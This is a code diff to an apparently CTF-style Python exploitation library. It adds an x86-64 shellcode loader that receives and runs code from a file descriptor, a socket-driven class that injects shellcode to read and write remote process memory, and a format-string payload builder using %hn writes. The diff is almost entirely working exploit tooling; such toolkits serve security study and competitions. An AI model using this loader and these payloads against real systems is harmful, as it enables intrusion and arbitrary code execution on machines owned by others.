@@ -401,11 +401,63 @@ class x86_64_shellcode:
     def read(fd, buf, sz):
         return x86_64_shellcode._read_write(fd, buf, sz, 0)
 
+    @staticmethod
+    def loader(rwx_buf, fd=0):
+        # TODO make a proper recvloop to account for segmentation
+        return x86_64.assemble("""
+        start:
+            mov rdi, {fd}
+            pop rsi
+            mov rsi, {buf}
+            mov rdx, 8
+            mov rax, 0   ; sys_read
+            syscall
+            mov rdi, {fd}
+            mov rdx, {buf}
+            mov rdx, [rdx]
+            mov rsi, {buf}
+            mov rax, 0   ; sys_read
+            syscall
+            mov rax, {buf}
+            call rax
+            jmp short start
+            """.format(fd=fd, buf=rwx_buf))
 
 for c in [x86_shellcode, x86_64_shellcode]:
     for k, sc in c.__dict__.items():
         if not k.startswith('_') and isinstance(sc, str):
             assert contains_not(sc, "\0")
+
+class Remote_x86_64(object):
+    """ Communicate with shellcode.loader """
+    def __init__(self, sock, fd_in=0, fd_out=1):
+        self.sock = sock
+        self.fd_in = fd_in
+        self.fd_out = fd_out
+
+    def execute(self, sc):
+        sc += x86_64.assemble("ret")
+        self.sock.sendall(struct.pack("Q", len(sc)) + sc)
+
+    def read(self, addr, sz):
+        self.execute(x86_64.assemble("""
+            mov rdi, {fd_out}
+            mov rsi, {addr}
+            mov rdx, {sz}
+            mov rax, 0   ; sys_write
+            syscall
+            """.format(addr=addr, sz=sz, fd_out=self.fd_out)))
+        return self.sock.recv(sz)
+
+    def write(self, addr, data):
+        self.execute(x86_64.assemble("""
+            mov rdi, {fd_in}
+            mov rsi, {addr}
+            mov rdx, {sz}
+            mov rax, 0   ; sys_read
+            syscall
+            """.format(addr=addr, sz=len(data), fd_in=self.fd_in)))
+        self.sock.sendall(data)
 
 libc = ctypes.CDLL("libc.so.6")
 def alloc_exec_buffer(buf):
@@ -469,17 +521,22 @@ def can_read(s, timeout=0):
 def wait_for_socket(s, timeout=1):
     return can_read(s, timeout)
 
-def read_until_str(s, content):
+def read_until(s, f):
+    if not callable(f):
+        f = lambda x, st=f: st in x
     buf = ""
-    while content not in buf:
-        buf += s.recv(1)
+    while not f(buf):
+        d = s.recv(1)
+        assert d
+        buf += d
     return buf
 
 def read_until_match(s, regex):
-    buf = ""
-    while not re.match(s, regex):
-        buf += s.recv(1)
-    return buf
+    return re.match(regex, read_until(s, lambda x: re.match(regex, x))).groups()
+
+def pause():
+    print "[*] Press enter to continue"
+    raw_input()
 
 def socket_interact(s):
     t = telnetlib.Telnet()
@@ -509,3 +566,22 @@ def sha1(s):
 
 def sh(s):
     return subprocess.check_output(['bash', '-c', s], stderr=subprocess.STDOUT)
+
+def make_format(addr, val, offset, dbg=False, bits=64):
+    """
+    Builds a format string for a word write.
+    You have to place addrstr such that %<offset>$p prints addr.
+    """
+    struct_fmt = "Q" if bits == 64 else "I"
+    vals = (0,) + struct.unpack("HHHH", struct.pack(struct_fmt, val))
+    fmt = addrstr = ""
+    for i in range(0, len(vals) - 1):
+        v = (vals[i+1] - vals[i]) & 0xffff
+        if dbg:
+            fmt += "+{} %{}$p ".format(v, offset+i)
+        else:
+            if v:
+                fmt += "%{}c".format(v)
+            fmt += "%{}$hn".format(offset+i)
+        addrstr += struct.pack(struct_fmt, addr+2*i)
+    return fmt, addrstr
